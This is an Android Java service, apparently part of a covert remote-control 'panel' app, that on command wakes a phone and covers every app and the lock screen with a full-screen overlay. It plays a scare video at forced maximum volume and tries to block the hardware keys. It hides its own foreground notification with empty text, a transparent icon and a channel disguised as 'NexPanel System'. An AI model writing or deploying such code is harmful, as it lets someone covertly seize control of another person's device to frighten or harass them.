package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetFileDescriptor;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.widget.FrameLayout;

import androidx.core.app.NotificationCompat;

/**
 * JumpscareService — Jumpscare Video Fullscreen Overlay
 * ══════════════════════════════════════════════════════
 *  ▸ Saat ACTION_START_JUMPSCARE diterima:
 *    1. Layar hp device menyala paksa (WakeLock)
 *    2. Overlay hitam fullscreen muncul di atas semua app / lockscreen
 *    3. Video jumpscare.mp4 (dari assets) diputar dengan volume MAX
 *    4. Saat video selesai → overlay otomatis hilang, hp kembali normal
 *
 *  ▸ ACTION_STOP_JUMPSCARE → paksa hentikan sebelum video selesai
 *
 * Alur ini TIDAK loop — video hanya diputar 1 kali lalu berhenti sendiri.
 */
public class JumpscareService extends Service implements SurfaceHolder.Callback {

    private static final String TAG      = "JumpscareService";
    private static final String CHANNEL  = "nex_jumpscare";
    private static final int    NOTIF_ID = 9992; // 9994=BlackScreenService, 9992=unik untuk Jumpscare

    public static final String ACTION_START_JUMPSCARE = "com.nex.panel.ACTION_START_JUMPSCARE";
    public static final String ACTION_STOP_JUMPSCARE  = "com.nex.panel.ACTION_STOP_JUMPSCARE";

    // Nama file video di folder assets
    private static final String ASSET_VIDEO = "jumpscare.mp4";

    // Singleton guard
    private static JumpscareService instance;
    public static boolean isRunning() { return instance != null; }

    private WindowManager        wm;
    private FrameLayout          overlayRoot;
    private SurfaceView          surfaceView;
    private MediaPlayer          mediaPlayer;
    private PowerManager.WakeLock wakeLock;
    private final Handler        uiHandler = new Handler(Looper.getMainLooper());

    // ── onCreate ──────────────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        createNotificationChannel();
        startForeground(NOTIF_ID, buildSilentNotification());
        acquireWakeLock();
    }

    // ── onStartCommand ────────────────────────────────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        String action = intent.getAction();

        if (ACTION_START_JUMPSCARE.equals(action)) {
            uiHandler.post(this::startJumpscare);
        } else if (ACTION_STOP_JUMPSCARE.equals(action)) {
            uiHandler.post(this::stopJumpscare);
        }
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── onDestroy ─────────────────────────────────────────────────────────
    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        releaseMediaPlayer();
        removeOverlay();
        releaseWakeLock();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // JUMPSCARE — tampilkan overlay video fullscreen
    // ═══════════════════════════════════════════════════════════════════════

    private void startJumpscare() {
        try {
            // Kalau sudah ada overlay sebelumnya, bersihkan dulu
            removeOverlay();

            // ─── Root FrameLayout hitam fullscreen
            FrameLayout root = new FrameLayout(this);
            root.setBackgroundColor(Color.BLACK);
            root.setFocusable(true);
            root.setFocusableInTouchMode(true);

            // Blokir semua tombol hardware selama jumpscare berlangsung
            root.setOnKeyListener((v, keyCode, event) ->
                keyCode == KeyEvent.KEYCODE_BACK        ||
                keyCode == KeyEvent.KEYCODE_HOME        ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH  ||
                keyCode == KeyEvent.KEYCODE_VOLUME_UP   ||
                keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
                keyCode == KeyEvent.KEYCODE_POWER
            );

            // ─── SurfaceView untuk video
            SurfaceView sv = new SurfaceView(this);
            sv.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT,
                Gravity.CENTER
            ));
            root.addView(sv);

            overlayRoot = root;
            surfaceView  = sv;

            // Daftarkan SurfaceHolder.Callback — MediaPlayer diinit setelah surface siap
            sv.getHolder().addCallback(this);

            // ─── WindowManager params — fullscreen di atas semua app + lockscreen
            int overlayType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                overlayType,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN  |
                WindowManager.LayoutParams.FLAG_FULLSCREEN         |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED   |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD   |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON     |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,    // focusable agar KeyListener aktif
                PixelFormat.OPAQUE
            );
            params.gravity = Gravity.TOP | Gravity.START;

            wm.addView(overlayRoot, params);
            Log.d(TAG, "Jumpscare overlay added");

        } catch (Exception e) {
            Log.e(TAG, "startJumpscare error: " + e.getMessage());
            stopSelf();
        }
    }

    private void stopJumpscare() {
        releaseMediaPlayer();
        removeOverlay();
        releaseWakeLock();
        stopSelf();
        Log.d(TAG, "Jumpscare stopped manually");
    }

    private void removeOverlay() {
        try {
            if (wm != null && overlayRoot != null) {
                wm.removeView(overlayRoot);
            }
        } catch (Exception ignored) {}
        overlayRoot = null;
        surfaceView  = null;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // SurfaceHolder.Callback — surface siap → init MediaPlayer
    // ═══════════════════════════════════════════════════════════════════════

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            releaseMediaPlayer();

            mediaPlayer = new MediaPlayer();

            // Audio: paksa ke stream MUSIC agar keluar dari speaker
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                mediaPlayer.setAudioAttributes(
                    new AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_MEDIA)
                        .setContentType(AudioAttributes.CONTENT_TYPE_MOVIE)
                        .build()
                );
            } else {
                mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            }

            // Paksa volume speaker ke MAXIMUM — efek jumpscare
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                    0
                );
                am.setSpeakerphoneOn(true);
            }

            // Load video dari assets (jumpscare.mp4)
            AssetFileDescriptor afd = getAssets().openFd(ASSET_VIDEO);
            mediaPlayer.setDataSource(
                afd.getFileDescriptor(),
                afd.getStartOffset(),
                afd.getLength()
            );
            afd.close();

            // Pasang surface
            mediaPlayer.setDisplay(holder);

            // TIDAK loop — video diputar 1x lalu selesai sendiri
            mediaPlayer.setLooping(false);
            mediaPlayer.setVideoScalingMode(
                MediaPlayer.VIDEO_SCALING_MODE_SCALE_TO_FIT_WITH_CROPPING);
            mediaPlayer.setScreenOnWhilePlaying(true);

            // ── Callback: video selesai → hp kembali normal otomatis ──
            mediaPlayer.setOnCompletionListener(mp -> {
                Log.d(TAG, "Jumpscare video complete — restoring device");
                uiHandler.post(this::stopJumpscare);
            });

            // ── Callback error
            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                Log.e(TAG, "MediaPlayer error: what=" + what + " extra=" + extra);
                uiHandler.post(this::stopJumpscare);
                return true;
            });

            // Siapkan async lalu play
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(mp -> {
                mp.start();
                Log.d(TAG, "Jumpscare video started");
            });

        } catch (Exception e) {
            Log.e(TAG, "surfaceCreated error: " + e.getMessage());
            uiHandler.post(this::stopJumpscare);
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        releaseMediaPlayer();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // HELPER — MediaPlayer & WakeLock
    // ═══════════════════════════════════════════════════════════════════════

    private void releaseMediaPlayer() {
        try {
            if (mediaPlayer != null) {
                try { if (mediaPlayer.isPlaying()) mediaPlayer.stop(); } catch (Exception ignored) {}
                try { mediaPlayer.reset(); } catch (Exception ignored) {}
                try { mediaPlayer.release(); } catch (Exception ignored) {}
                mediaPlayer = null;
            }
        } catch (Exception ignored) {}
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "NexPanel:JumpscareWakeLock"
                );
                wakeLock.acquire(10 * 60 * 1000L); // max 10 menit
            }
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    // ═══════════════════════════════════════════════════════════════════════
    // NOTIFICATION (foreground service wajib punya notif)
    // ═══════════════════════════════════════════════════════════════════════

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL, "NexPanel System", NotificationManager.IMPORTANCE_NONE);
            ch.setSound(null, null);
            ch.enableVibration(false);
            ch.setShowBadge(false);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm =
                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildSilentNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setSmallIcon(R.drawable.ic_transparent)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(false)
            .build();
    }
}
